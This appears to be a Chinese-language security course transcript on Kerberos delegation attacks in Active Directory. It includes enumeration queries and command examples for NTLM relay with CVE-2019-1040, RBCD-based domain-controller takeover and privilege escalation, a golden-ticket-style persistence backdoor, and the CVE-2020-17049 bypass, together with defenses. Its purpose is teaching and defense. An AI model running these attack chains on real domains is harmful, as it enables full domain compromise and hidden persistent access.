![](img/3cfa3a3c7b33ab31aea58ac5540f160a_0.png)

# 课程 P1：内网渗透之委派攻击详解 🔐

在本课程中，我们将学习域环境中的一项高级攻击技术——委派攻击。我们将从基础概念入手，逐步深入到基于资源的约束性委派（RBCD）的实战利用，并探讨权限维持与防御绕过等高级话题。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_2.png)

---

## 1. 什么是域委派？ 🤔

上一节我们介绍了课程概述，本节中我们来看看域委派的基础概念。

域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限访问域内的其他服务。它是大型网络中经常部署的应用模式，为多跳认证带来了便利，但同时也带来了安全隐患。攻击者利用委派可以获得本地管理员甚至域管理员权限，还可以制作深度隐蔽的后门。

要理解委派，需要先了解 Kerberos 协议的基础流程。以下是 Kerberos 身份认证的简要流程图，主要分为三部分：

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_4.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_6.png)

1.  **第一部分**：客户端向域控制器（KDC）的 AS 认证服务请求 TGT 认购权证。
2.  **第二部分**：客户端使用 TGT 向 KDC 的 TGS 服务请求访问特定服务的 ST 服务票据。
3.  **第三部分**：客户端使用 ST 服务票据请求目标服务的资源。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_8.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_10.png)

今天的内容主要关注前两部分（1-4步）。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_12.png)

为了更直观地理解委派，我们来看一个流程示例：
*   域用户 `test` 通过 Kerberos 身份验证访问 Web 服务器以下载文件。
*   但文件实际存放在后台的文件服务器上。
*   于是，Web 服务器的服务账号模拟用户 `test`，以 Kerberos 协议去认证后台的文件服务器。
*   文件服务器将文件返回给 Web 服务器，再由 Web 服务器返回给用户。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_13.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_15.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_17.png)

这样就完成了一次委派流程。这里用户 `test` 对 Web 服务器的认证也可以是 NTLM 或基于表单的认证。如果需要委派，则可能涉及“协议转换”，这是我们后面会讲到的内容。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_19.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_21.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_23.png)

---

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_25.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_26.png)

## 2. 域委派的分类 📂

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_28.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_30.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_32.png)

上一节我们了解了域委派的基本概念，本节中我们来看看委派的具体分类。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_34.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_36.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_38.png)

域委派主要有三种应用模式：
1.  非约束性委派
2.  约束性委派
3.  基于资源的约束性委派

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_39.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_41.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_42.png)

我们将着重讲解第三种，即基于资源的约束性委派（RBCD）的利用。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_44.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_46.png)

### 非约束性委派

微软在发布 Windows Server 2000 和活动目录时，提供了一种简单机制来支持用户通过 Kerberos 向 Web 服务器进行身份验证，并代表该用户访问后端服务器，这就是最早的非约束性委派。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_48.png)

对于非约束性委派，服务账号可以获取被委派用户的 TGT 认购权证，并将其缓存在 LSASS 进程中。从而，服务账号可以使用该 TGT 模拟用户访问任意的服务。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_50.png)

配置非约束性委派需要 `SeEnableDelegationPrivilege` 特权，该特权通常只授予域管理员。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_52.png)

以下是配置和识别非约束性委派的方法：

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_54.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_55.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_57.png)

*   **配置方法**：在机器或服务账号的“属性”->“委派”中，选择“信任此计算机来委派任何服务”。
*   **属性标识**：配置了非约束性委派的账号，其 `userAccountControl` 属性会包含特定的标志位。
    *   **机器账号**：`WORKSTATION_TRUST_ACCOUNT` 标志，对应数值 `528384`。
    *   **服务账号**：`NORMAL_ACCOUNT` 标志，对应数值 `528400`。
*   **查询命令**：
    *   查询域内配置了非约束性委派的**机器账号**：`AdFind -b "DC=domain,DC=com" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName`
    *   查询域内配置了非约束性委派的**服务账号**：`AdFind -b "DC=domain,DC=com" -f "(&(samAccountType=805306368)(msDS-AllowedToDelegateTo=*))" cn distinguishedName`

**非约束性委派攻击简述**：攻击者可以利用配置了非约束性委派的服务账号或机器账号。在打印机漏洞（PrintNightmare）出现前，需要诱使域管理员访问该机器以捕获其 TGT。打印机漏洞出现后，可直接强制域控制器回连到攻击者控制的机器，从而捕获 TGT，进而导出域内哈希。由于非约束性委派在企业中已较少使用，此处不再深入。

---

## 3. 约束性委派 🔗

由于非约束性委派的不安全性，微软在 Windows Server 2003 中发布了约束性委派。为了在 Kerberos 协议层面支持约束性委派，微软扩展了 `S4U2self` 和 `S4U2proxy` 两个子协议。

对于约束性委派，服务账号只能获得该用户访问**特定服务**的 ST 服务票据，从而只能模拟该用户访问特定的服务。配置了约束性委派的账户的 `msDS-AllowedToDelegateTo` 属性会指定可以对哪些 SPN 进行委派。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_59.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_61.png)

配置约束性委派同样需要 `SeEnableDelegationPrivilege` 特权，通常也只授予域管理员。

约束性委派有两种配置选项：
1.  **仅使用 Kerberos**：不能进行协议转换。
2.  **使用任何身份验证协议**：可以进行协议转换（即允许 `S4U2self`）。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_63.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_65.png)

**协议转换的应用场景**：当用户通过非 Kerberos 方式（如表单认证）认证 Web 服务时，Web 服务无法获得用户的 Kerberos 票据。此时需要启用协议转换，使 Web 服务能代表用户请求一个可转发的服务票据。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_67.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_69.png)

以下是约束性委派的流程，涉及两个关键协议：

1.  **S4U2self**：服务可以代表任意用户，向 KDC 请求一张针对**服务自身**的可转发 ST 服务票据。此过程**不需要用户密码**。
2.  **S4U2proxy**：服务使用上一步获得的可转发 ST 票据，以用户的名义，向 KDC 请求访问**另一个指定服务**的 ST 服务票据。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_71.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_72.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_74.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_76.png)

整个约束性委派攻击流程可概括为：
1.  用户以其他方式（如 NTLM）认证服务 A。
2.  服务 A 以用户名义，通过 `S4U2self` 协议，向 KDC 请求一张访问服务 A 自身的可转发 ST 票据。
3.  KDC 返回该可转发 ST 票据。
4.  服务 A 再以用户名义，通过 `S4U2proxy` 协议，并附加上一步的可转发 ST 票据，向 KDC 请求访问服务 B 的 ST 票据。
5.  KDC 返回访问服务 B 的 ST 票据。
6.  服务 A 即可使用该票据以用户身份访问服务 B。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_78.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_80.png)

从攻击角度看，如果攻击者控制了服务 A 的账号，且服务 A 被配置了到域控制器 CIFS 服务的约束性委派，则攻击者可以模拟任意用户访问域控制器的 CIFS 服务，相当于控制了域控制器。但实战中，企业很少会配置此类委派。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_82.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_84.png)

**查询命令**：
*   查询域内配置了约束性委派的**主机**：`AdFind -b "DC=domain,DC=com" -f "(&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*))" cn distinguishedName msDS-AllowedToDelegateTo`
*   查询域内配置了约束性委派的**服务账号**：`AdFind -b "DC=domain,DC=com" -f "(&(samAccountType=805306368)(msDS-AllowedToDelegateTo=*))" cn distinguishedName msDS-AllowedToDelegateTo`

---

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_86.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_88.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_90.png)

## 4. 基于资源的约束性委派（RBCD） 🎯

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_92.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_93.png)

上一节我们介绍了传统的约束性委派，本节中我们来看看更灵活、攻击面更广的基于资源的约束性委派。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_95.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_97.png)

为了使资源管理更加独立，微软在 Windows Server 2012 中引入了基于资源的约束性委派。RBCD 不需要域管理员权限去设置，而是将设置属性的权限赋予了机器（资源）自身。它允许资源（服务）自己决定谁可以委派给自己。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_99.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_101.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_103.png)

RBCD 只能在运行 Windows Server 2012 R2 及以上版本的域控制器上配置，但可以在混合模式域中使用。

配置了 RBCD 的账号，其 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性值为被允许委派的账号的 SID。而在其“委派”属性页中没有任何配置。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_105.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_107.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_109.png)

### RBCD 的优势与差异

与约束性委派相比，RBCD 具有以下优势：
1.  委派的权限设置在后端资源（服务 B）上，而不是前端服务（服务 A）。
2.  传统的约束性委派不能跨域，但 RBCD 可以跨域。
3.  不再需要域管理员权限，只需要拥有在计算机对象上编辑 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性的权限。通常，将计算机加入域的用户和计算机自身拥有此权限。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_111.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_113.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_115.png)

**核心差异**：
*   **传统约束性委派（正向）**：在服务 A 上设置属性，允许其委派到服务 B。
*   **基于资源的约束性委派（反向）**：在服务 B 上设置属性，允许服务 A 来委派给自己。

---

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_117.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_119.png)

## 5. 利用 RBCD 进行攻击 ⚔️

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_121.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_123.png)

本节我们将探讨如何利用 RBCD 实现两个主要攻击目标：接管域控制器和本地权限提升。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_125.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_126.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_127.png)

### 场景一：结合 NTLM Relay 接管域控制器

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_129.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_130.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_132.png)

此场景通常结合 CVE-2019-1040（绕过 NTLM MIC 校验）和打印机漏洞触发 NTLM Relay。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_134.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_136.png)

**攻击步骤**：
1.  **创建机器账号**：利用已控的普通域用户权限，创建一个新的机器账号（如 `service2`）。域内普通用户默认可创建最多10个机器账号。
    *   命令示例（使用工具）：`AddMachineAccount -machinename service2 -password root`
2.  **发起组合攻击**：使用工具监听，并利用打印机漏洞强制域控制器向攻击者发起 NTLM 认证，随后将该认证 Relay 到域控制器的 LDAP 服务，并利用 CVE-2019-1040 绕过签名要求。
    *   监听命令示例：`ntlmrelayx -t ldap://域控制器IP --remove-mic --delegate-access -smb2support`
    *   攻击命令示例：`printerbug.py 域/用户名:密码@备份域控制器IP 攻击者IP`
3.  **配置 RBCD**：通过 Relay 成功的 LDAP 连接，修改目标域控制器（`AD02`）的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，添加我们创建的机器账号（`service2`）的 SID。这样 `service2` 就被允许委派到 `AD02`。
4.  **获取票据**：使用 `service2` 的账号和密码，通过 `S4U2self` 和 `S4U2proxy` 协议，请求访问 `AD02` 的 CIFS 服务的 ST 票据。**注意**：在 RBCD 流程中，`S4U2self` 请求的票据其 `forwardable` 标志位为 0，这与传统约束性委派（标志位为1）不同。
5.  **导入票据并访问**：将获取的 ST 票据导入当前会话，即可获得对域控制器 CIFS 服务的高权限访问。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_138.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_139.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_140.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_142.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_144.png)

### 场景二：进行本地权限提升

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_145.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_147.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_149.png)

此场景适用于已获得“将计算机加入域的用户”或“Account Operators 组”成员权限的情况。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_151.png)

**场景A：利用“加域用户”权限**
1.  假设我们获得了用户 `test` 的权限，且 `test` 曾将主机 `WIN2008` 加入域。
2.  我们在已控的 `WIN7` 上（以 `test` 身份登录），创建一个新的机器账号 `service3`。
3.  利用 `test` 对 `WIN2008` 的写权限，配置 `WIN2008` 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，允许 `service3` 委派给它。
4.  后续利用步骤与场景一类似：用 `service3` 账号请求访问 `WIN2008` CIFS 服务的票据，导入后即可获得 `WIN2008` 的 SYSTEM 权限。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_153.png)

**场景B：利用“Account Operators 组”权限**
1.  `Account Operators` 组成员拥有对除域控制器外所有机器账号的某些管理权限。
2.  查询该组成员：`AdFind -b "CN=Account Operators,CN=Builtin,DC=domain,DC=com" member`
3.  假设我们获得了该组成员 `t2` 的权限。我们可以用类似方法，让新创建的机器账号 `service4` 获得对域内其他非域控主机（如 `WIN7`）的 RBCD 权限，从而提升至 SYSTEM 权限。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_155.png)

---

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_157.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_159.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_161.png)

## 6. 利用 RBCD 打造变种黄金票据 🎫

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_163.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_165.png)

上一节我们学习了利用 RBCD 进行横向移动和提权，本节我们看看如何在已控域控制器后，利用 RBCD 进行隐蔽的权限维持。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_167.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_169.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_170.png)

假设服务 B 是 KDC 本身（SPN: `krbtgt`），服务 A 是我们控制的一个账号。在我们已获得域控制器权限后，可以执行以下操作：

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_172.png)

1.  **创建服务账号**：创建一个我们控制的机器账号或服务账号（如 `service5`）。
2.  **配置 RBCD**：在域控制器上，配置 `krbtgt` 服务的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，允许 `service5` 委派给它。这意味着 `service5` 可以获取 KDC 的服务票据。
3.  **获取高权限票据**：使用 `service5` 的凭据，通过 RBCD 流程，请求一张以域管理员身份访问 `krbtgt` 服务的 ST 票据。这张票据本质上是一个高权限的 TGT（因为 KDC 的服务就是颁发 TGT）。
4.  **权限维持**：此后，无论域管理员密码如何更改，我们都可以使用 `service5` 的凭据和此技术，随时伪造出任意用户身份的高权限 TGT，实现类似“黄金票据”的持久化访问能力。

**关键命令示例**：
*   请求票据：`getST.py -spn krbtgt/域名 -impersonate administrator -dc-ip 域控制器IP 域名/service5:密码`
*   此票据格式特殊，需使用 `KRB5CCNAME` 环境变量指定，并通过 `-k` 选项进行 Kerberos 认证访问服务。

---

## 7. 域委派攻击的防范与绕过 🛡️

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_174.png)

最后，我们来探讨如何防御委派攻击以及已知的绕过方法。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_176.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_178.png)

### 推荐防御措施
1.  **设置高权限用户“敏感账户，不能被委派”**：在域用户属性的“账户”页中勾选此选项。
2.  **主机账号委派设置为“仅使用Kerberos”的约束性委派**：避免使用非约束性委派和允许协议转换的约束性委派。
3.  **使用受保护的用户组**：Windows Server 2012 R2 引入了受保护的用户组，该组中的用户不允许被委派。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_180.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_182.png)

### 绕过措施（CVE-2020-17049）
上述防御措施可被 CVE-2020-17049（Kerberos 青铜比特攻击）绕过。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_184.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_186.png)

**绕过原理**：
1.  在 RBCD 的 `S4U2self` 阶段，KDC 会检查请求中的 ST 票据的 `forwardable` 标志位。
2.  如果标志位为 0，则走 RBCD 检查流程（会校验“敏感账户，不能被委派”）。
3.  如果标志位为 1，则走传统约束性委派检查流程（不会校验“敏感账户，不能被委派”）。
4.  攻击者控制的服务账号可以解密自己发出的 `S4U2self` ST 票据（因为知道密钥），将其中 `forwardable` 标志位从 0 改为 1 并重新加密。由于该标志位不在票据的 PAC 签名范围内，KDC 无法察觉篡改。
5.  修改后的票据使 KDC 误以为这是传统约束性委派请求，从而跳过了对“敏感账户，不能被委派”的检查，成功返回票据。

**彻底修复**：需要安装微软补丁 KB4598347。该补丁为 `S4U2self` 请求返回的 ST 服务票据增加了第三个签名（票据签名），任何对票据内容的篡改都会导致签名验证失败。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_188.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_189.png)

---

## 总结 📝

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_191.png)

本节课中我们一起学习了域委派攻击的完整知识体系：
1.  **基础概念**：理解了域委派的定义、目的与 Kerberos 基础流程。
2.  **分类详解**：区分了非约束性、约束性和基于资源的约束性委派。
3.  **核心攻击面**：深入研究了基于资源的约束性委派（RBCD）的原理与巨大优势。
4.  **实战利用**：掌握了利用 RBCD 结合 NTLM Relay 接管域控制器，以及进行本地权限提升的方法。
5.  **权限维持**：学习了利用 RBCD 打造变种黄金票据，实现隐蔽的后渗透权限维持。
6.  **防御与绕过**：了解了针对委派攻击的常规防御措施及 CVE-2020-17049 漏洞的绕过原理。

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_193.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_195.png)

![](img/3cfa3a3c7b33ab31aea58ac5540f160a_197.png)

通过本课程，你应该对域环境中这一高级攻击技术有了系统性的认识，并能够在安全测试中加以识别和利用，同时也能更好地规划防御策略。